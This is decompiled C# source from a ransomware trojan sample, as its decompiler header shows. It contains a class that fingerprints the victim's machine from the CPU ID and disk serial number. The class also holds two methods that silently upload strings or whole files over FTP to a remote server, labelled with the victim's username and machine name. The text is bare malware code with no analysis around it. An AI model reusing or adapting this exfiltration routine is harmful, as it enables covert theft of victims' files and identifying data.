// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.MfnxCHhUwIjyzc
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace MufMaOSvGyvz
{
  internal sealed class MfnxCHhUwIjyzc
  {
    public static string HHmRdTUQTZoj()
    {
      string empty = string.Empty;
      using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementClass("win32_processor").GetInstances().GetEnumerator())
      {
        if (enumerator.MoveNext())
          empty = enumerator.Current.Properties["processorID"].Value.ToString();
      }
      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + "C" + ":\"");
      managementObject.Get();
      return managementObject["VolumeSerialNumber"].ToString() + empty;
    }

    public static void qkCGSsikzw(
      string AYGEFRLByvvc = "URL",
      string bWHhiqLjYJjlJ = "USERNAME",
      string YOjlHhEIoQa = "ACCESO",
      string KYfRRhHmvJaq = "")
    {
      try
      {
        string str = MfnxCHhUwIjyzc.HHmRdTUQTZoj();
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(AYGEFRLByvvc + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + str + ".txt");
        ftpWebRequest.Method = "STOR";
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(bWHhiqLjYJjlJ, YOjlHhEIoQa);
        byte[] bytes = new ASCIIEncoding().GetBytes(KYfRRhHmvJaq);
        ftpWebRequest.ContentLength = (long) bytes.Length;
        using (Stream requestStream = ftpWebRequest.GetRequestStream())
          requestStream.Write(bytes, 0, bytes.Length);
      }
      catch
      {
      }
    }

    public static void OahdOXOuXvYsd(
      string zxXgUOQaPMcjTwJ = "URL",
      string shCgxQKbpDrjP = "USERNAME",
      string BgGKwsKTzpt = "ACCESO",
      string LrnCoaPZsGSyiOc = "")
    {
      try
      {
        string str = MfnxCHhUwIjyzc.HHmRdTUQTZoj();
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(zxXgUOQaPMcjTwJ + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + str + ".txt");
        ftpWebRequest.Method = "STOR";
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(shCgxQKbpDrjP, BgGKwsKTzpt);
        byte[] bytes;
        using (StreamReader streamReader = new StreamReader(LrnCoaPZsGSyiOc))
          bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
        ftpWebRequest.ContentLength = (long) bytes.Length;
        using (Stream requestStream = ftpWebRequest.GetRequestStream())
          requestStream.Write(bytes, 0, bytes.Length);
      }
      catch
      {
      }
    }
  }
}
